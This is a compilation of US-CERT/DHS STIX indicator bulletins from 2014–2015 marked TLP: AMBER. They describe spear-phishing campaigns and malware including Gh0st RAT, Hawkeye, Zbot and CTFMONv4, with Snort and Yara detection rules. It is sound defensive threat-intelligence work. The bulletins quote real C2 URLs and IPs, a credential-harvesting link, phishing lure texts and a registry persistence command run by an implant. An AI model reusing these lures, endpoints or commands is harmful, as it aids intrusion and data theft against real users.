stix:STIX_Header.stix:Title: Command and Control Sites Identified from eFax Spear Phishing Campaign
stix:STIX_Header.stix:Description: Additional command and control (C2) sites were identified during the examination of malware related to a late February 2015 eFax spear phishing campaign.

stix:Indicator.indicator:Description:
This is an encrypted configuration file related to malware from the eFax spear phishing campaign. The malware called back to the following C2 sites:
http://202.76.237.216:443/search.php http://www.getiton.hants.org.uk:80/themes/front/img/ajax.php

This C2 site was identified during analysis of malware related to a late February 2015 eFax spear phishing campaign. It was associated with the malware configuration file racss.dat (MD5: 54C774CC16725868712E344D80BCEC30).

This C2 site was identified during analysis of malware related to a late February 2015 eFax spear phishing campaign. It was associated with the malware configuration file racss.dat (MD5: 54C774CC16725868712E344D80BCEC30, MD5: BFE93862514887B8BE272E01CA1F4334, and MD5: E084A992DD25E7420ED98DE84094B132).
This is an encrypted configuration file related to malware from the eFax spear phishing campaign. The malware called back to the C2 site http://www.getiton.hants.org.uk:80/themes/front/img/ajax.php

This C2 site was identified during analysis of malware related to a late February 2015 eFax spear phishing campaign. It was associated with the malware configuration file racss.dat (MD5: D5B10B1EEFF8E83D3480CBD05B8718CC).

stix:STIX_Header.stix:Title: CTFMONv4 Variant X Malware and Signatures
stix:STIX_Header.stix:Description:
On 25 March 2015, a malware sample of CTFMONv4 Variant X was analyzed by a US Government Department. Signatures were developed based on the subdirectory naming algorithm used in communications with the command and control (C2) sites.
Note that the naming convention of Variant X was assigned for analysis purposes. The malware itself does not self-identify its variants.

stix:Indicator.indicator:Description:
File Import Hash: 89449F41FB814A43BEB60D0997508770 PE Compile time: 2015-02-05 13:54:30 File type: 32 bit DLL (export: "DllTest_2")
This is a CTFMONv4 Variant X malware sample. All known versions of CTFMON use HTTP GET requests and server responses for command and control (C2) over TCP port 80. The format of the CTFMONv4 Variant X HTTP GET requests varies significantly from other versions, as there are two beacons with Variant X, and the second beacon has a unique structure.
CTFMONv4 Variant X differs from Variants A, B, and C most significantly in its C2 communications. The initial request "GET /<xxxxx>.html" contains a variable number that falls into the a range between 11111 to 43878. This communication is new in Variant X.
Variant X also differs from Variants A, B, and C in that the second GET request's initial sub-directory is no longer a legible word, but rather a string of characters generated through an algorithm new to variant X. The initial GET request's sub-directory will always be four or six characters in length and will be comprised only of letters from the lowercase alphabet (a-z). These 4 or 6 characters are initially selected variably, then the second-to-last character is modified according to an algorithm:
(0xD9 or 0xDA or 0xDB)* - (first character in string)** == (2nd-to-last character in string) *One of these three static values is selected randomly. ** Selected randomly from the first 24 characters of the lowercase English alphabet (a-x).
Given this algorithm, the following table can be built to predict the second-to-last character: If the first randomly selected character is a-z, then the 2nd-to-last character will be one of these three values:
a: x y z b: w x y c: v w x d: u v w e: t u v f: s t u g: r s t h: q r s i: p q r j: o p q k: n o p l: m n o m: l m n n: k l m o: j k l p: i j k q: h i j r: g h i s: f g h t: e f g u: d e f v: c d e w: b c d x: a b c
The remainder of the GET string contains well-obfuscated victim information buffered with a random-length random string, which could defeat network signatures.
The following Snort rule can potentially identify valid Variant X traffic based on the unique relationship between characters in the initial sub-directory as described above. Due to the variation in the communication structure, the content match must be as loosely defined as possible to allow the Perl Compatible Regular Expression (PCRE) to execute and complete the more thorough check of the packet. The signature is designed to detect instances when the first character is 'a'. A total of 23 modified versions of this signature should be deployed to detect the other possible initial characters. As a consequence of this matching, a large number of false-positives is possible.
Example Snort rule to detect instances when the first character of the beacon is 'a':
alert tcp any any <> any [80] (msg:"IMPLANT_BEACON";content:"GET /a"; pcre:"/\/a[a-z]{1,3}[xyz][a-z]\//"; sid:1;)
The following is a Yara signature designed to detect CTFMON V4 Variant X, specifically the portions that build the 4 or 6 character sub-directory described by the algorithm presented earlier: rule
implant_varx_beacon_sub_dir_builder { strings: $BuildAlphabetString = {8A C8 80 C1 61 88 4C 04 14 40 83 F8 1A 7C F1} $BuildRando = {33 D2 F7 F3 46 8A 54 14 1C 88 54 37 FF 3B F5 72} $SetupConstants = {3C 78 5E C7 44 24 08 D9 00 00 00 C7 44 24 0C DA 00 00 00 C7 44 24 10 DB 00 00 00 C7 44 24 14 00 00 00 00 5B} $Modify2ndToLastChar = {B9 03 00 00 00 F7 F9 8B 4C 24 54 8B C5 8A 54 94 04 2A 17 C6 04 2F 00 88 54 2F FE} condition: all of them }

stix:STIX_Header.stix:Title: Spear-Phishing Email Using "Fwd: Syria attack video moves UN to tears" Theme Containing Malicious Attachment
stix:STIX_Header.stix:Description: On April 19, 2015, US-CERT was notified by a trusted third party of a spear-phishing campaign using "Fwd: Syria attack video moves UN to tears" themed email containing a malicious attachment.

marking:Marking_Structure.simpleMarking:Statement: This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: AMBER. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp.

stix:Indicator.indicator:Description:
----- BEGIN EMAIL BODY -----
---------- Forwarded message ---------- From: hewitt hasnain<hasnain.hewitt@gmail.com> Date:2015-04-17 17:30 GMT+08:00 Subject: Syria attack video moves UN to tears To: Mitchell Helen <helen.mitchell.dfat@gmail.com>
A video showing desperate attempts by doctors to save three children after an apparent chlorine gas attack in Syria moves UN Security Council members to tears.
----- END EMAIL BODY -----

EmailMessageObj:Header.EmailMessageObj:Subject: Fwd: Syria attack video moves UN to tears

stix:Indicator.indicator:Description: When run in Microsoft Word 2007 the document takes advantage of vulnerability CVE-2012-0158 to drop two benign word documents, both named "Chlorine Video.doc" (located in different directories) and a malicious executable named "word.exe". It then executes "word.exe" and the "Chlorine Video.doc" file located in C:\Documents and Settings\User\Local Settings\Temp.
This is a benign MS Word document.
This is a benign MS Word document.

The implant displays the icon of a Microsoft Word Document. It runs the following command: C:\WINDOWS\system32\cmd.exe /c reg add hkcu\software\microsoft\windows\currentversion\run /v hotkey /t reg_sz /d ""C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\update.exe -st"" /f & move ""C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\word.exe"" ""C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\update.exe"". The command adds persistence by installing a registry key and also moves "%temp%\word.exe" to "%temp%\update.exe".
The implant will execute on next login/reboot and makes a DNS query for: "apple.dnsrd.com". A connection is attempted to port 443. If successful, an HTTP GET request is sent.
Network traffic is via port 443.

stix:STIX_Header.stix:Title: Spear-Phishing Email Using Malicious Attachments Containing a PlugX Malware Variant
stix:STIX_Header.stix:Description: On April 19, 2015, US-CERT was notified by a trusted third party of a spear-phishing campaign using malicious attachments that contained a PlugX malware variant. Of note, on November 11, 2014, IB-14-20197 was released which was related to this spear-phishing campaign.

stix:Indicator.indicator:Description: This is a self-extracting RAR attachment.
Network traffic is via port 80, 443, 2002, and 8080.

stix:STIX_Header.stix:Title: Phishing Email with Middle East Aviation Theme Includes Hawkeye Keylogger
stix:STIX_Header.stix:Description: On 25 December 2014, a phishing email was sent from info@mebaa.com with the subject "MIDDLE EAST BUSINESS AVIATION SHOW(REPORTS $ BROCHURE)". The email included a malicious link to a credential harvesting site at http://alter23.altervista.org/google.html. It also included the malicious attachment meba2014reportsandcatalog.rar (MD5: ee8184421b339b2a9b2ff3345bd26cd1), which contained the Hawkeye keylogger.

EmailMessageObj:Header.EmailMessageObj:Subject: MIDDLE EAST BUSINESS AVIATION SHOW(REPORTS $ BROCHURE)

stix:Indicator.indicator:Description: A link to this URL was included in the email. It was identified as a credential harvesting site.
This attachment contained a commercial crimeware keylogger called Hawkeye (MD5: 48192cbca1003de018ebc616914b3d37).

This executable file is a crimeware keylogger called Hawkeye, as identified by the strings. Exfiltration can occur via various protocols. The specific C2 site for this incident was not identified but may be the URL "http://192.99.212.64/WebPanel/log.php?username=" according to other sources.

The Hawkeye Keylogger meba2014reportsandcatalog.exe (MD5: 48192cbca1003de018ebc616914b3d37) may have exfiltrated data to "http://192.99.212.64/WebPanel/log.php?username=".
IP addresses related to HawkEye keylogger exfiltration include the following:
31.220.16.223 31.220.16.243 31.170.164.69 31.170.164.145 31.170.165.106 31.170.165.133 31.170.165.192 31.170.165.196 31.170.165.231 192.99.212.64
The IP address 192.99.212.64 was also used as a HawkEye C2 site in a previous phishing campaign described in IB-15-10081.

stix:STIX_Header.stix:Title: Phishing Emails with Invoice or Fortune 1000 CEO Theme Include Zbot Trojan
stix:STIX_Header.stix:Description: On 24 October 2014, phishing emails were sent from xs@xszsjx.com (41.220.68.49) to managers and senior leadership at an energy sector organization. The phishing emails used different themes such as a purchase order and Fortune 1000 CEOs. The emails included a malicious link to the domain www.theprincesynergy.com, which leads to Zbot malware. The Zbot malware calls back to marketheadway.ddns.net (41.138.182.174).

stix:Indicator.indicator:Description:
This email contained a .rar archive attachment with a malicious executable file. It was detected that the executable was a Zbot Trojan according to multiple dynamic analysis systems. Pivoting on the sending IP revealed seven other discarded emails over a four month period, which targeted managers, vice presidents, and executives. ---- BEGIN EMAIL HEADER ---- EHLO us-alimail-mta1.hst.scl.en.alidc.net MAIL FROM: RCPT TO: [REDACTED] DATA X-Alimail-AntiSpam:AC=CONTINUE;BC=0.2102815|-1;FP=17252146626637381199|11|1|278|0|-1|-1|-1;HT=r46d02004;MF=xs@xszsjx.com;PH=DW;RN=99;RT=0;SR=0; Received: from WS-web (xs@xszsjx.com[41.220.68.49]) by r41g06043.xy2.aliyun.com at Fri, 24 Oct 2014 11:47:31 +0800 Date: Fri, 24 Oct 2014 11:47:31 +0800 From: "=?UTF-8?B?5YW055ub?=" Return-Path: "=?UTF-8?B?5YW055ub?=" Reply-To: "=?UTF-8?B?5YW055ub?=" Message-ID: Subject: =?UTF-8?B?UmU6IFdlIGFyZSByZWFkeSBub3cgdG8gbWFrZSBwdXJjaGFzZQ==?= X-Mailer: Alimail-Mailagent revision 2663350 MIME-Version: 10 Return-Path: References: 4f45b1e6-6df9-42f2-b594-999809176c66@xszsjx.com In-Reply-To: 4f45b1e6-6df9-42f2-b594-999809176c66@xszsjx.com Content-Type: multipart/mixed; boundary="----=ALIBOUNDARY_2108_52515940_5449cbd3_6759d" ---- END EMAIL HEADER ---- This is a multi-part message in MIME format. ---- BEGIN EMAIL BODY ---- ------=ALIBOUNDARY_2108_52515940_5449cbd3_6759d Content-Type: multipart/alternative; boundary="----=ALIBOUNDARY_2108_52515940_5449cbd3_6759e" ------=ALIBOUNDARY_2108_52515940_5449cbd3_6759e Content-Type: text/plain; charset="UTF-8" Content-Transfer-Encoding: quoted-printable Hello,=0A=0AMy apology for not responding to your emails on time=0A=0AWe are = ready now to make purchase as i have attached our Purchase Order, pictures and= the specifications=0A=0AWe will want for two 40feet container to ship to us= =0A=0AWe will be waiting for your quotation/ PI so we can conclude on how to m= ake our first instalment of advance payment=0A=0AWill be waiting to hear from= you as soon as possible=0A=0A=0AKind regards,=0A=0A[REDACTED signature block]=0A=0A=0A=0A = = = ------=ALIBOUNDARY_2108_52515940_5449cbd3_6759e Content-Type: text/html; charset="UTF-8" Content-Transfer-Encoding: quoted-printable
Hello,


2014 Fortune 1000 CEO Replacement-- Man: Woman=3D 252= :1

Among the CEOs of Fortune=0D=0A1000 in 2014, there are= 253 CEO replacements, man: woman=3D 252:1. Women hold 46=0D=0ACEO positions a= t Fortune 1000 in 2013 and 53 in 2014.  = The departure rate for men is 252/947=3D26.61%=0D=0Aand 1/53=3D1.87% fo= r women.  The most common=0D=0Apl= acement is departure=E2=80=A6more

Contact: Wenny Fr= eeman, Manager

= = T H E   I   P R I N C E   I<= font size=3D"2">  S Y N E R G Y

EmailMessageObj:Header.EmailMessageObj:Subject: Re: We are ready now to make purchase

stix:Indicator.indicator:Description: This is the malicious link included in the phishing emails.

This file was identified as a Zbot or Kazy Trojan. According to its PE32 resources, the language identifier was set to Chinese.
A registry key was created to enable persistence: [User]\S-1-5-21-1202660629-583907252-1801674531-500\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\Explorer.EXE = "C:\Documents and Settings\[User]\Application Data\Awocac\irpuy.exe"s\\0
The malware used the Tasklist utility to enumerate running processes, and the Netsh.exe utility to stop the Windows Firewall.
It checks for connectivity to http://www.google.com:80/webhp then calls back to marketheadway.ddns.net.
The Zbot Trojan sent POST requests to this URL via TCP port 80. The domain resolved to IP 41.138.182.174 at the time of the report. This site was detected as a potential fast flux domain.

stix:STIX_Header.stix:Title: Malicious Email Contains Ghost RAT Attachment
stix:STIX_Header.stix:Description:
On 17 December 2014 a US government department reported on an email with the subject "Sexy Girls". The email contained a Ghost RAT variant in a malicious zip file attachment with the name Sexy Girls.zip (MD5: 2366a3919f7a38860d474f81c0bf94c1). If installed, the RAT attempts to communicate with the domain www.meitanjiaoyiwang.com.
The following indicator bulletins contained the same command and control (C2) domain www.meitanjiaoyiwang.com:
IB-14-10600 IB-14-10619 IB-14-10591 IB-14-10636

----- START EMAIL HEADER #2 ----- EHLO resqmta-po-09v.sys.comcast.net MAIL FROM: alex_eaves@comcast.net SIZE=485308 RCPT TO:[REDACTED] DATA Received: from resomta-po-07v.sys.comcast.net ([96.114.154.231]) by resqmta-po-09v.sys.comcast.net with comcast id UC3U1p00A4zp9eg01C3U6q; Tue, 16 Dec 2014 12:03:28 +0000 Received: from resmail-po-052v.sys.comcast.net ([162.150.176.62]) by resomta-po-07v.sys.comcast.net with comcast id UC3U1p0051M9FeA01C3UQG; Tue, 16 Dec 2014 12:03:28 +0000 Date: Tue, 16 Dec 2014 12:03:28 +0000 (UTC) From: alex_eaves@comcast.net Subject: Sexy Girls MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_Part_7389248_1591487032.1418731408047" X-Originating-IP: [::ffff:174.139.86.74] X-Mailer: Zimbra 8.0.7_GA_6031 (ZimbraWebClient - FF34 (Win)/8.0.7_GA_6031) Thread-Topic: Sexy Girls Thread-Index: fEceOzQcgCUCyojgfwY4e0nXbGoRWA== DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=comcast.net; s=q20140121; t=1418731408; bh=Ff3EQ1pHcfB8TONH9hayED3+m859n/+kQowqaNx9ih4=; h=Received:Received:Date:From:To:Message-ID:Subject:MIME-Version: Content-Type; b=Ca9wILQSVtCqP2405pIf3VeYbxcWpIZ8Yt6vqno1i3uS/D6E950L/q/shGN1MK83m 43S9ehi46hQcxuSH5z3ycHfXbxsD0d+RFWpOWD+UYjNWP8BsT/Dfsy1v24c5FdrL5v Si9pPVEKtjzEcz32enkergn63rLSRZn0jYgSxRD1fH/xpdaf4zORGNKCsnaLDtnOpB haXTAiqWorSaVcyA/Wt3y7XWp+t6C2BHaTSo9Dcoa0uqNUjoPPvLJmA6gCLI4JnKcD adMRNr/56spT1UVaLdzASUyXkeyfRSD4inQrLhf1ddjXC6TFR7vOUfGyI/15z/kl5+ IImMfpxl6pr1g== ------=_Part_7389248_1591487032.1418731408047 Content-Type: multipart/alternative; boundary="----=_Part_7389249_1213723439.1418731408047" ------=_Part_7389249_1213723439.1418731408047 Content-Type: text/plain; charset=utf-8 Content-Transfer-Encoding: 7bit ----- END EMAIL HEADER #2 ----- Body of email was blank but contained the following signature: "I know not what weapons WWIII will be fought with, WWIV will be fought with sticks and stones"~Albert Einstein
This is a ZIP file that contains the malicious file "Sexy Girls.Exe".

When Sexy Girls.Exe is executed, it installs the Ghost RAT with the command "RUNDLL32.EXE C:\Recycle09102014\GameUpdate.log,LoaderEntry" and then deletes itself. For persistence, auto run entries are added to the registry.

This file is a Ghost RAT implant that writes the keylog file "ky1log.dat" to the %system32% directory and send system information such as service pack and computer name to the domain www.meitanjiaoyiwang.com.
The implant mutex is "MyKeepLive1009".
File: ky1log.dat Size: Varies MD5: Varies This is an encoded keylog file. The hash and file size will vary as the user interacts with the system.

stix:STIX_Header.stix:Title: IP Addresses and Malicious Files Associated with Healthcare Breach
stix:STIX_Header.stix:Description: On 01 February 2015, IP addresses from a breach of a healthcare organization were identified connecting to and transferring sensitive data to the domain sharefile.com. A variant of the pwdump password hash extraction tool was also identified.

stix:Indicator.indicator:Description: This IP address was observed moving sensitive data to the domain sharefile.com. This IP also hosted an FTP server that was used to download post exploitation tools including dump32.exe (MD5: 59c311a7299ed0b71ed0035f8f526ad6), which is a pwdump variant.
This file is a pwdump variant. Pwdump is used to extract password hashes from the Windows registry/SAM file.
This IP address was observed connecting to the location on the domain sharefile.com where the sensitive data was stored.

stix:STIX_Header.stix:Title: Phishing Email with Pleasantly Surprised Theme Includes Gh0st RAT
stix:STIX_Header.stix:Description:
On 01 and 02 December 2014, multiple emails were sent with the subject "Pleasantly surprised". The emails included the malicious attachment Pleasantly surprised.zip (MD5: fa3c3155387c614f3ba55bc5c734be8a). The Gh0st remote administration tool (RAT) calls back to www.meitanjiaoyiwang.com.
Multiple phishing campaigns previously used the "Pleasantly surprised" theme with a Gh0st RAT payload. Similar activity was also tracked under the name "Lonely Warrior".
This activity was recently reported in IB-14-10600.

---- BEGIN EMAIL BODY ---- Subject: Pleasantly surprised From: [REDACTED] To: [REDACTED] Date: Tue Dec 02 15:48:46 GMT 2014 ---- END EMAIL BODY ----
The email body was blank.
This .zip archive contained the Gh0st RAT installer Pleasantly Surprised.exe (MD5: 6CF90837519B9D1CBB593EA059E3E470).

Path: C:\Documents and Setting\[User]\Desktop\Pleasantly Surprised.exe
This is the installer for the Gh0st RAT variant. Upon execution, it launches in the process tree followed by the sub-processes CMD.exe and RunDLL32.exe. RunDLL32.exe contains the following argument at the command line:
RunDLL32.exe C;\Recycle09102014\GameUpdate.log, LoaderEntry
The original .exe file was deleted from the desktop, and all processes were closed except RunDll32.exe. The process RunDLL32.exe was also responsible for writing to kyllog.dat.
Two files were installed: C:\WINDOWS\system32\kyllog.dat (MD5: 547A8D58BAFCF1E09FE968ABA73872E5) C:\Recycle09102014\GameUpdate.log (MD5: 43A9B8015D89E707695B5B381F694F51)

This is a Gh0st RAT implant DLL file loaded with the RunDLL32.exe, and the entry point of "LoaderEntry" @ 0100066A7. This file writes to kyllog.dat (MD5: 547A8D58BAFCF1E09FE968ABA73872E5).
Network Signatures are as follows: IP/Domain: www.meitanjiaoyiwang.com Port: 702 Protocol: HTTP

This is a data file created by the Gh0st RAT implant. It contained the following data:
Oh9QPLXSTRVB2?Xoh9!60. ?oh9!X>5+,&-51>QP>Xohoh

stix:STIX_Header.stix:Title: Malware Implant Uses Public Storage Mechanisms for Exfiltration
stix:STIX_Header.stix:Description: On or around 25 April 2015, a U.S. Government Agency released information regarding malware that uses persistent public storage mechanisms in conjunction with command and control(C2) infrastructure. The public storage mechanisms are used for exfiltration, as well as malware delivery. These storage services include Google Drive, OneDrive, and Dropbox. The malicious actor utilized The Onion Router (TOR) to obfuscate remote access and potentially exfiltrate data. To obfuscate C2 traffic, the malicious actor uses a plugin called Meek that is installed as a service called google Update within TOR. Meek utilizes transport layer security (TLS) to encrypt communications and relay traffic through a legitimate third party, such as the services listed above.

stix:Indicator.indicator:Description:
The malicious file was named WERMGR.EXE (file size: 50688). Within the file properties of malware, identified by the source as IMPLANT 4, the version information is identical to the benign system file also called WERMGR.EXE. This system file is found on 64-bit systems in the system32 directory. Using this technique is required to legitimize the malware. The implant is HTTP based and written in .NET. It's core capabilities include the ability to remotely execute PowerShell commands and download then execute local files on the target system. When files are remotely downloaded to the target system, they are stored in the following directories:
<APPDATA>\Adobe <LOCALAPPDATA>\Temp IMPLANT 4 sleeps for five to ten minutes before calling back to the C2 site and then spawns an instance of Internet Explorer to send and receive traffic from the C2 server. This data is stored in the internet cache directory: <INTERNETCACHE>\Low\Content.IE5
The implant is also capable of using AES decryption, which it requires for processing the C2. There are two known variants of this particular malware. Both variants use a unique obfuscator and store the AES key differently. The second variant utilizes Twitter for C2.
The URL http://pivotglobalresources.com/bestpractices.html is one possible callback from WERMGR.EXE with an IP address resolution of 199.168.29.240.
The response content SHA256: 4cc51782f39393ae98b3e69bb6c24d5f2499cb606317da1023792823dc7511a0.

stix:STIX_Header.stix:Title: Malicious Forged HTTP Packets Contain Implants Communications
stix:STIX_Header.stix:Description: As early as 21 July 2014 and as recent as 4 November 2014, 21 networks within a U.S. Government Department were scanned with forged packets. The forged packets had the ACK, ACK + PSH, or SYN flags set. This likely caused content-based filtering devices to trigger, which allowed attackers to test the networks and gain insight into the open or closed ports.

stix:Indicator.indicator:Description:
This user agent string was consistent among all activity, when present.
This HTTP field purported to represent a Windows XP (NT 5.1) host using a Chrome browser (version 11.0.696.68). This specific Chrome version was released in Spring 2011.
Many of the inbound forged packets appear to be in the direction of the acknowledgements session (ACK) in the TCP handshake; there were no packets noted with these activities that indicated the initiation of the TCP handshake however.
Different HTTP host domains were used in each packet. The content of the sites varied in topics and languages. Additionally, these sites have not been characterized as malware domains. The domains used during this activity and HTTP host site description are:
mp3clan.com - search engine for free music files unicef.com - international children's rights organization mylifetime.com - cable television network whois.com.au - Australian domain name registration itools.cn - Chinese software to manage Apple software bealifesaverofgoodness.com - medical, health, and safety blog mercadopago.com.br - Brazilian online payment service club-de-sexo-secreto.com - Spanish pornography site forbes.pl - Polish mirror of financial news site friv.uk.com - web-based games dragonquest.jp - Japanese video game site actu-money2.com - parked domain panteon-finance.com - Russian financial site lampsplus.com - U.S. lighting retailer socialbookmarkings.net - crowd sourced bookmarks search engine onlinehile.org - Turkish online game mightytest.net - parked domain
Whois information reveals the network 111.196.0.0/16 is registered to China Unicom Beijing province network No. 21 Jin-Rong Street Beijing, 100140.

HTTPSessionObj:Parsed_Header.HTTPSessionObj:User_Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML##comma## like Gecko) Chrome/11.0.696.68 Safari/534.24

stix:STIX_Header.stix:Title: Phishing Email Attempt with Apple Account Theme
stix:STIX_Header.stix:Description: On 25 September 2014 an energy sector organization received a phishing email that contained a malicious URL. The URL attempts to lure the recipient with a notice to verify an email address for an Apple account.

stix:Indicator.indicator:Description:
The following is the email that was received: --------------BEGIN EMAIL HEADER----------------- Received: from pps.filterd ([REDACTED] [127.0.0.1]) by [REDACTED] (8.14.5/8.14.5) with SMTP id s8P2NA03016844 for <[REDACTED]>; Wed, 24 Sep 2014 21:23:10 -0500 Received: from ssh.ispadmin.eu (ssh.ispadmin.eu [95.173.193.40]) by [REDACTED] with ESMTP id 1pkxdjbyk2-1 for <[REDACTED]>; Wed, 24 Sep 2014 21:23:09 -0500 Received: from sentinel.net-service.cz (sentinel.net-service.cz [95.173.193.60]) by ssh.ispadmin.eu (Postfix) with ESMTP id 26A5EAD5BB for <[REDACTED]>; Thu, 25 Sep 2014 04:50:11 +0200 (CEST) Received: from localhost (localhost.localdomain [127.0.0.1]) by sentinel.net-service.cz (Postfix) with ESMTP id A7584192380AB for <[REDACTED]>; Thu, 25 Sep 2014 04:22:41 +0200 (CEST) X-Virus-Scanned: Debian amavisd-new at xen-etch Received: from sentinel.net-service.cz ([127.0.0.1]) by localhost (sentinel.net-service.cz [127.0.0.1]) (amavisd-new, port 10024) with ESMTP id 0X5925e5j8Ii for <[REDACTED]>; Thu, 25 Sep 2014 04:22:41 +0200 (CEST) Received: by sentinel.net-service.cz (Postfix, from userid 1005) id BD656192350DD; Thu, 25 Sep 2014 04:22:30 +0200 (CEST) To: [REDACTED] Subject: =?UTF-8?Q?You_have_a_problem_with_your_Apple_account=2c?= Date: Thu, 25 Sep 2014 04:22:30 +0200 From: =?UTF-8?Q?Apple_Service?= Message-ID: <4bd6254265dd92ae58d601b088062d2b@www.wt-pro.eu> X-Priority: 3 MIME-Version: 1.0 Content-Transfer-Encoding: quoted-printable X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:5.12.52,1.0.28,0.0.0 000 definitions=2014-09-25_02:2014-09-25,2014-09-25,1970-01-01 signatures=0 X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0 suspec tscore=41 phishscore=28 adultscore=0 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1 engine=7.0.1-1402240000 definitions=main-1409250026 Content-Type: text/html; charset="windows-1252" --------------END EMAIL HEADER----------------- --------------BEGIN EMAIL BODY----------------- Itunes Connect This is an EXTERNAL email. STOP. T= HINK before you CLICK links or OPEN attachments.

Dear client ,

You have a problem with your Apple account,

=20

We just need to verify that this e-mail address belongs to you.

=20

Simply click the link below and login using "Apple ID" and your passwor= d.

Verify Now

For more information, see Questions and answers.


Thank you,

The Apple customer support.

Copyright =A9 2014 Apple Inc. All rights rese= rved. | Privacy Policy
=20=20=20=20 . --------------END EMAIL BODY-----------------

The URL directs the victim to a non-Apple destination. Other activity from the second-level domain gulfup.com, specifically im45.gulfup.com, has been seen and captured in past reporting.
The domain im45.gulfup.com was reported as a callback domain in IB-14-10132.
The URL also directs the victim to a non-Apple destination. The third-level domain of the URL is hosted at IP address 204.45.61.36.
The URL also directs the victim to a non-Apple destination. The third-level domain of the URL is hosted at IP address 74.220.215.225.

stix:STIX_Header.stix:Title: FF-RAT Malware Indicators Identified
stix:STIX_Header.stix:Description: On May 26, 2015, US-CERT was notified by a trusted third party of indicators of compromise (IOCs) related to FF-RAT malware.

marking:Marking_Structure.simpleMarking:Statement: This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: AMBER. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp.

stix:STIX_Header.stix:Title: Phishing Emails with Pleasantly Surprised Theme Include Gh0st RAT
stix:STIX_Header.stix:Description:
On 17 December 2014, emails with the subject "Pleasantly surprised" were sent from multiple earthlink.net email addresses to a U.S. Government Department. The emails contained the malicious attachment Pleasantly surprised.zip, which contained a variant of the Gh0st remote administration tool (RAT). The Gh0st RAT called back to www.meitanjiaoyiwang.com over UDP on port 703.
Multiple campaigns with a similar theme and indicators were previously identified, most recently in IB-14-10636.

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADER ---- DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws; s=dk20050327; d=earthlink.net; b=TVMlcnuHifBF2NZ4UhfGBw/qhmXVFhJnAriddI27KB2sPJl8Ku+XmHVtsF2GCKO1; h=Message-ID:Date:From:Reply-To:To:Subject:Mime-Version:Content-Type:X-Mailer:X-ELNK-Trace:X-Originating-IP; Received: from [209.86.224.66] (helo=wamui-junio.atl.sa.earthlink.net) by elasmtp-galgo.atl.sa.earthlink.net with esmtpa (Exim 4.67) (envelope-from <jwade0069@earthlink.net>) id 1Y1EoW-0006MM-DJ; Wed, 17 Dec 2014 08:38:52 -0500 Received: from 221.11.109.13 by webmail.c.earthlink.net with HTTP; Wed, 17 Dec 2014 08:38:51 -0500 Message-ID: <14880031.1418823531724.JavaMail.root@wamui-junio.atl.sa.earthlink.net> Date: Wed, 17 Dec 2014 21:38:51 +0800 (GMT+08:00) From: jwade <jwade0069@earthlink.net> Reply-To: jwade <jwade0069@earthlink.net> To: Targets Subject: Pleasantly surprised Mime-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_Part_535_4100528.1418823531062" X-Mailer: EarthLink Zoo Mail 1.0 X-ELNK-Trace: 20159922115ca2e0fa747de3e47b93b77e972de0d01da940636837464489fb28f356e057e00dea42350badd9bab72f9c350badd9bab72f9c350badd9bab72f9c X-Originating-IP: 209.86.224.66 ---- END EMAIL HEADER ----
The email body of messages sent from the first compromised account was blank.

---- BEGIN EMAIL HEADER ---- DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws; s=dk20050327; d=earthlink.net; b=LARVf5JDNfKX9wn4fA+E0LiuJIpTUHPJ1e7n2d039n0gvjKLWBYATPOuAAJRLFAX; h=Message-ID:Date:From:Reply-To:To:Subject:Mime-Version:Content-Type:X-Mailer:X-ELNK-Trace:X-Originating-IP; Received: from [209.86.224.35] (helo=elwamui-huard.atl.sa.earthlink.net) by elasmtp-masked.atl.sa.earthlink.net with esmtpa (Exim 4.67) (envelope-from <ladyhawker@earthlink.net>) id 1Y1FhI-0006Ms-5Q; Wed, 17 Dec 2014 09:35:28 -0500 Received: from 221.11.109.10 by webmail.earthlink.net with HTTP; Wed, 17 Dec 2014 09:35:25 -0500 Message-ID: <1715701.1418826925743.JavaMail.root@elwamui-huard.atl.sa.earthlink.net> Date: Wed, 17 Dec 2014 22:35:25 +0800 (GMT+08:00) From: ~Angie Buchanan <ladyhawker@earthlink.net> Reply-To: ~Angie Buchanan <angiebuchanan@uchicago.edu> To: [REDACTED] Subject: Pleasantly surprised Mime-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_Part_615_845712.1418826925487" X-Mailer: EarthLink Zoo Mail 1.0 X-ELNK-Trace: 7dc5fa2414b73f34c8ad ---- END EMAIL HEADER ----
---- BEGIN EMAIL BODY ---- Subject: Pleasantly surprised From: ladyhawker@earthlink.net To: [REDACTED] Date: Wed Dec 17 14:35:25 GMT 2014 Attachments: Pleasantly surprised.zip (350951 bytes) "Life should not be a journey to the grave with the intention of arriving safely in a pretty and well preserved body, but rather to skid in broadside, thoroughly used up, totally worn out, and loudly proclaiming - WOW---What A Ride!" ~Unknown ---- END EMAIL BODY -----
A similar email was observed from this sender address.
A similar email was observed from this sender address.
A similar email was observed from this sender address.
A similar email was observed from this sender address.
A similar email was observed from this sender address.
This file is a ZIP archive that contains the malicious file Pleasantly surprised.Exe (MD5: 1e4fec554d34f400d23dee343165bb6e).

